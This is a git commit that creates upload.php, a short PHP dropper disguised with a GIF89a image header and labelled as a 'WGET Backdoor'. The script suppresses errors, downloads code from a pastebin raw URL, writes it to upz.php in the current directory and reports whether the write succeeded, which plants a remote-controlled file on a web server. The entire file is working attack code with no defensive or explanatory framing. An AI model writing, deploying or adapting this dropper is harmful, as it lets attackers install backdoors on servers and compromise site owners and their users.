60938dc25cfc49804f27d0d1a01092a824a8ab46
PRE55I <36572182+PRE55I@users.noreply.github.com>
2018-05-04 23:26:50 +0530

    Create upload.php

---
+++ upload.php
@@ -0,0 +1,22 @@
+GIF89a;
+<?php
+//-----------------------------------------------------------------------
+//                         ZGH CSRF
+//-----------------------------------------------------------------------
+error_reporting(0);
+$filename="upz.php";
+$fget=file_get_contents("https://pastebin.com/raw/S2GRZnfC");
+
+// WGET Backdoor
+$path=getcwd().DIRECTORY_SEPARATOR;
+$fileopen=fopen("$path/$filename",'w');  
+$execfile=fwrite($fileopen,$fget);
+	if($execfile)
+	{
+		echo "Success: $path$filename";
+	}
+	else {
+		echo "Failed execute newfile $filename in $path";
+	}
+// EOF
+?>
